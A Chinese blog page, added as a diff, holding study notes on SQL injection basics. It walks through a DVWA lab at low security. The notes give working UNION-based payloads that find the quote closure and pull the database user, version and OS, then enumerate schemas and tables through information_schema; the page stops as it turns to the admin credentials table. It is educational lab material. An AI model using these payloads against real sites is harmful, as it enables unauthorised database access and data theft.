@@ -1,0 +1,1585 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='科幻大片:黑客猫vs安全狗'><title>Web安全:SQL注入基础知识和简单绕过笔记</title>
+
+<link rel='canonical' href='https://kira-pgr.github.io/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/'>
+
+<link rel="stylesheet" href="/scss/style.min.ac77dcf8b111b51da39a92990f431923f210f3876d85798a2125667f96dc33a4.css"><meta property='og:title' content='Web安全:SQL注入基础知识和简单绕过笔记'>
+<meta property='og:description' content='科幻大片:黑客猫vs安全狗'>
+<meta property='og:url' content='https://kira-pgr.github.io/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/'>
+<meta property='og:site_name' content='猫猫の博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Web Sec' /><meta property='article:published_time' content='2022-08-29T13:25:06&#43;08:00'/><meta property='article:modified_time' content='2022-08-29T13:25:06&#43;08:00'/><meta property='og:image' content='https://kira-pgr.github.io/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/cover.jpg' />
+<meta name="twitter:title" content="Web安全:SQL注入基础知识和简单绕过笔记">
+<meta name="twitter:description" content="科幻大片:黑客猫vs安全狗"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://kira-pgr.github.io/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/cover.jpg' /><head>
+    <style>
+ .blur {
+   color: transparent;
+   text-shadow:0px 0px 8px rgba(0,0,0,0.5)
+}
+
+.blur:hover {
+   color: transparent;
+   text-shadow:0px 0px 0px rgba(0,0,0,1)
+
+}
+
+.shady {
+   color:#000;
+   font-weight: bold;
+   box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; 
+   transition: all 0.3s ease;
+}
+.shady:hover{
+  font-weight: bold;
+   color:#FFF;
+   box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; 
+}
+</style>
+</head>
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/zh-cn/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu6303347a79895c67737217ae3756b054_237429_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/zh-cn">猫猫の博客</a></h1>
+            <h2 class="site-description">Cat, but learning CS</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Kira-Pgr'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/zh-cn/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/zh-cn/%E5%85%B3%E4%BA%8E%E6%9C%AC%E5%96%B5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于本喵</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/zh-cn/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>猫の存档</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/zh-cn/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>猫の搜索</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/zh-cn/%E7%8C%AB%E3%81%AE%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>猫の链接</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://kira-pgr.github.io/" >English</option>
+                        
+                            <option value="https://kira-pgr.github.io/zh-cn/" selected>中文</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/">
+                <img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/cover_hub39257f7b520a72e81a71654a57446e0_105468_800x0_resize_q75_box.jpg"
+                        srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/cover_hub39257f7b520a72e81a71654a57446e0_105468_800x0_resize_q75_box.jpg 800w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/cover_hub39257f7b520a72e81a71654a57446e0_105468_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="327" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:SQL注入基础知识和简单绕过笔记" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/zh-cn/categories/security/" >
+                Security
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/">Web安全:SQL注入基础知识和简单绕过笔记</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            科幻大片:黑客猫vs安全狗
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 29, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="web安全sql注入基础知识和简单绕过">Web安全:SQL注入基础知识和简单绕过</h1>
+<p><del>这是一只Hacker猫在学习SQL注入的时候留下的笔记</del></p>
+<h2 id="概念">概念</h2>
+<p>网上嘛&hellip;都是那么一大长串的概念&hellip;特别难记</p>
+<p>简单理解概括一下本质，其实就可以缩减成一句话</p>
+<blockquote>
+<p><strong>攻击者插入恶意的SQL语句，使得原本的语句产生歧义，从而达到攻击者的目的</strong></p>
+</blockquote>
+<p>所以说，SQL注入攻击要成功的话得满足以下条件</p>
+<ul>
+<li>
+<p>恶意SQL语句要被带入数据库执行</p>
+<p>也就意味着:</p>
+<ul>
+<li>
+<p>网站要有数据库</p>
+</li>
+<li>
+<p>该处与数据库有交互</p>
+</li>
+<li>
+<p>用户输入的数据会被代入SQL语句</p>
+</li>
+</ul>
+</li>
+<li>
+<p>代码不再按照原本的逻辑，而是以攻击者的逻辑运行</p>
+</li>
+</ul>
+<h2 id="分类">分类</h2>
+<p>一句话说就是:分为显著和盲注;)</p>
+<h3 id="显注">显注</h3>
+<p>这个没什么好说的，就是当攻击者拼接SQL语句注入时，网站会把SQL语句的执行结果显示在网页上.</p>
+<p>很明<strong>显</strong>对吧= =</p>
+<blockquote>
+<p>Tip: 一般显注很多时候都要用到<code>UNION</code>,如果关键词检测就怼<code>UNION</code>和<code>SECLET</code>的话可以用盲注的payload,毕竟盲注的payload显注也能梭哈，就是烦了点(</p>
+</blockquote>
+<h3 id="盲注">盲注</h3>
+<p>盲注与显著相反，网站不会把SQL语句的执行结果显示出来。</p>
+<p>当然，盲注还分为两个小类，分别是</p>
+<ul>
+<li>
+<p>布尔型</p>
+<p>这个一般在网站只提示你是或者否的时候</p>
+</li>
+<li>
+<p>时间型</p>
+<p>最适合梭哈的类型，要是显著和布尔型盲注无从下手就可以用时间型</p>
+<p>而且，<strong>时间型注入的payload是所有类型SQL注入通用的</strong></p>
+</li>
+</ul>
+<h2 id="靶场实战">靶场实战</h2>
+<h3 id="显注-1">显注</h3>
+<p>将DVWA安全级别调为<code>low</code>,并来到<code>SQL Injection</code>界面</p>
+<p>我们看到一个输入框</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/22.jpg"
+	width="860"
+	height="161"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/22_hudaf6cd9d61365c1defa70485ebc53995_12960_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/22_hudaf6cd9d61365c1defa70485ebc53995_12960_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="嗯!是输入框酱!"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="534"
+		data-flex-basis="1281px"
+	
+></p>
+<h4 id="检测注入点">检测注入点</h4>
+<p>输入<code>1'</code>疯狂试探</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_21-47.png"
+	width="1440"
+	height="455"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_21-47_hu62d30ca4a1dd161ea82db75d5094f6b4_13591_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_21-47_hu62d30ca4a1dd161ea82db75d5094f6b4_13591_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="哟吼，报错了"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="316"
+		data-flex-basis="759px"
+	
+></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">You</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">syntax</span><span class="p">;</span><span class="w"> 
+</span><span class="w"></span><span class="k">check</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">manual</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">corresponds</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">MariaDB</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="k">version</span><span class="w"> 
+</span><span class="w"></span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">right</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">near</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="mi">1</span><span class="s1">&#39;&#39;&#39; at line 1
+</span></code></pre></div><p>看到报错，说明这里肯定有注入点</p>
+<p>(我们的输入被带入数据库中执行并引发了歧义)</p>
+<h4 id="查询数据库中信息">查询数据库中信息</h4>
+<p>我们先<del>逝世</del>试试看该如何闭合原SQL语句</p>
+<h5 id="闭合篇">闭合篇</h5>
+<p>第一次尝试双引号闭合</p>
+<p>发现<code>1&quot; and 1=2#</code>返回结果</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-08.png"
+	width="361"
+	height="144"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-08_hu2ea3796bc889b5893b13e9f5ae9dd2a6_7308_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-08_hu2ea3796bc889b5893b13e9f5ae9dd2a6_7308_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="啊哦，看来不大行"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="601px"
+	
+></p>
+<p>看起来双引号并不能起到闭合的作用</p>
+<p>再看看单引号</p>
+<p>输入<code>1' and 1=2#</code>发现查询不到结果，</p>
+<p>输入<code>1' and 1=1#</code>有结果且和输入<code>1</code>的结果相同</p>
+<p>所以:↓↓↓</p>
+<blockquote>
+<p><strong>TaDa! 单引号闭合成功</strong></p>
+</blockquote>
+<h5 id="union篇">UNION篇</h5>
+<p>现在，该利用联合查询，查看一下字段数量和查询的数据回显的位置。</p>
+<p>发现在输入<code>1' and 1=2 union select 1,2 #</code>的时候刚好不报错</p>
+<blockquote>
+<p>一个小Tip:为了不使UNION前面的语句查询到的结果干扰测试，</p>
+<p>这里用and 1=2 把前面的结果干掉了喵~~</p>
+<p>当然把1改成-1也可以 (其实本质就是让UNION前面的语句查到结果)</p>
+</blockquote>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-20.png"
+	width="398"
+	height="120"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-20_hufc6f81bb8cfe0704ddf5d46dc48992fd_8485_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-20_hufc6f81bb8cfe0704ddf5d46dc48992fd_8485_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="这里可以看一下回显1,2的位置"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="331"
+		data-flex-basis="796px"
+	
+></p>
+<p>所以，我们可以发现<strong>First name</strong>处显示结果为第一个查询结果的值，<strong>surname</strong>处显示结果为第二个查询结果的值</p>
+<p>接下来,利用各种内置函数注入得出连接数据库用户以及数据库名称和版本，操作系统类型:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="s1">&#39; and 1=2 union select user(),database()#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="k">global</span><span class="p">.</span><span class="n">version_compile_os</span><span class="p">,</span><span class="k">version</span><span class="p">()</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="o">#</span><span class="w">
+</span></code></pre></div><p>结果:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">ID: 1&#39; and 1=2 union select user(),database()#  
+First name: root@localhost  
+Surname: dvwa
+
+ID: 1&#39; and 1=2 union select @@global.version_compile_os,version() from mysql.user#  
+First name: Linux  
+Surname: 5.5.68-MariaDB
+</code></pre></div><h5 id="你好数据篇">你好，数据篇</h5>
+<p>接下来就是要到了逐步获取库名，表名，列名，数据的环节了</p>
+<p>高版本的mysql和MariaDB数据库有一个特征，即information_schema库.</p>
+<p>information_schema 库用于存储数据库<strong>元数据</strong>(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</p>
+<p>information_schema 库中:</p>
+<ul>
+<li>
+<p><code>SCHEMATA</code>表存储了数据库中的所有库信息，</p>
+</li>
+<li>
+<p><code>TABLES</code>表存储数据库中的表信息，包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。</p>
+</li>
+<li>
+<p><code>COLUMNS</code>表存储表中的列信息，包括表有多少列、每个列的类型等</p>
+</li>
+</ul>
+<p>于是乎，我们可以通过元数据去查询库名，表名和列名</p>
+<hr>
+<p>查询库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="w"> </span><span class="mi">1</span><span class="s1">&#39; and 1=2 union select 1,schema_name from information_schema.schemata #
+</span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-04.png"
+	width="785"
+	height="577"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-04_hu403cf5aa384d9f623671947e9b3dd694_81787_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-04_hu403cf5aa384d9f623671947e9b3dd694_81787_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="数据库，喵喵认识你啦"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="326px"
+	
+></p>
+<p>查看dvwa库中的所有表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="w"> </span><span class="mi">1</span><span class="s1">&#39; and 1=2 union select 1,table_name from information_schema.tables where table_schema= &#39;</span><span class="n">dvwa</span><span class="s1">&#39;#
+</span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-06.png"
+	width="1025"
+	height="146"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-06_hu749c7c07d5e743d52d76667cdaac4105_25986_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-06_hu749c7c07d5e743d52d76667cdaac4105_25986_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="又认识了一些表"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="702"
+		data-flex-basis="1684px"
+	
+></p>
+<p>作为一个黑客猫猫，肯定关心存储管理员用户与密码信息的表;)</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/9.jpg"
+	width="240"
+	height="240"
